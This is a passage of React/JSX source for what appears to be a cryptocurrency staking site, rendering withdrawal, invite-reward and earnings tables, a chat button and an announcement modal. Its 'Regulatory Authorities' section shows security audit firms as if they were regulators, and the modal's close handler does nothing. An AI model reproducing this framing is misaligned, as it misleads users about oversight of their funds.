                                  <span className="text-blue-400 text-sm font-medium">{record.payAmount}</span>
                                  <span className="text-green-400 text-sm font-medium">{record.receiveAmount}</span>
                                  <span className={`text-sm font-medium ${
                                    record.status === t.completed ? 'text-green-400' : 
                                    record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                  }`}>{record.status}</span>
                      </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                    </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 提现记录 */}
                      {recordsSubTab === 'withdraw' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.amount}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.status}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : withdrawRecords.length > 0 ? (
                              withdrawRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-white text-sm font-medium">{record.amount}</span>
                                  <span className={`text-sm font-medium ${
                                    record.status === t.completed ? 'text-green-400' : 
                                    record.status === t.processing ? 'text-blue-400' :
                                    record.status === t.pending ? 'text-yellow-400' : 'text-gray-400'
                                  }`}>{record.status}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 邀请奖励记录 */}
                      {recordsSubTab === 'shared' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.address}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.income}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : sharedRecords.length > 0 ? (
                              sharedRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-blue-400 text-sm font-medium truncate" title={record.address}>
                                    {record.address.substring(0, 8)}...{record.address.substring(record.address.length - 6)}
                                  </span>
                                  <span className="text-green-400 text-sm font-medium">{record.income}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 收益记录 */}
                      {recordsSubTab === 'earnings' && (
                        <div className="space-y-4">
                          {/* 表格头 */}
                          <div className="grid grid-cols-3 gap-4 pb-2 border-b border-gray-600/30">
                            <span className="text-gray-400 text-sm font-medium">{t.time}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.earnings}</span>
                            <span className="text-gray-400 text-sm font-medium">{t.earningsRate}</span>
                          </div>

                          {/* 记录列表 */}
                          <div className="space-y-2 max-h-60 overflow-y-auto">
                            {recordsLoading ? (
                              <div className="flex justify-center py-8">
                                <div className="text-gray-400">{t.loading}...</div>
                              </div>
                            ) : earningsRecords.length > 0 ? (
                              earningsRecords.map((record, index) => (
                                <div key={index} className="grid grid-cols-3 gap-4 py-2 border-b border-gray-700/30 hover:bg-gray-800/30 rounded">
                                  <span className="text-gray-300 text-sm">{record.time}</span>
                                  <span className="text-green-400 text-sm font-medium">${record.earnings}</span>
                                  <span className="text-blue-400 text-sm font-medium">{record.rate}</span>
                                </div>
                              ))
                            ) : (
                              <div className="text-center py-8 text-gray-400">
                                {t.noRecords}
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                  </div>
                )}
              </div>
            </div>
          </section>
        </>
      )}

      {/* Help Center */}
      <section className="py-8 px-4 bg-black">
        <div className="max-w-6xl mx-auto">
          <HelpCenterAccordion />
        </div>
      </section>

      {/* Regulatory Authorities */}
      <section className="py-1 px-4 bg-black">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-3 gold-text slide-in-up">
            {t.regulatoryAuthorities}
          </h3>
          <div className="grid grid-cols-3 gap-3 md:gap-6">
            <Card className="bg-white p-4 md:p-6 floating shadow-md hover:shadow-lg transition-all duration-300">
              <img
                src="https://ext.same-assets.com/590002659/396665122.png"
                alt="FairyProof"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="bg-white p-4 md:p-6 floating-delay-2s shadow-md hover:shadow-lg transition-all duration-300">
              <img
                src="https://ext.same-assets.com/590002659/2552246351.png"
                alt="Certik"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="bg-white p-4 md:p-6 floating-delay-4s shadow-md hover:shadow-lg transition-all duration-300">
              <img
                src="https://ext.same-assets.com/590002659/2879882895.png"
                alt="SlowMist"
                className="w-full h-12 md:h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
          </div>
        </div>
      </section>

      {/* Cooperative Platform */}
      <section className="py-1 px-4 bg-black">
        <div className="max-w-6xl mx-auto">
          <PartnersCarousel />
        </div>
      </section>

      {/* Exchange Tab */}
      {activeHomeTab === 'exchange' && (
        <section className="px-3 md:px-4 bg-black">
          <BinanceLiquidityStaking userEthBalance={userProfile?.eth ? Number.parseFloat(userProfile.eth.toString()) : 0} />
        </section>
      )}

      {/* 移除质押 Modal - 现在按钮直接执行verify操作 */}

      
      {/* Draggable Chat Button */}
      <DraggableChatButton onOpenChat={() => {
        window.open('https://chat.boltcode.vip?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=0&special=1', '_blank', 'noopener,noreferrer')
      }} />
      
      {/* Enhanced Announcement Modal */}
      {showAnnouncement && announcements.length > 0 && (
        <EnhancedAnnouncementModal
          isOpen={showAnnouncement}
          onClose={() => {}}
          announcements={announcements}
          currentIndex={currentAnnouncementIndex}
          userAddress={account}
        />
      )}
    </div>
  )
}
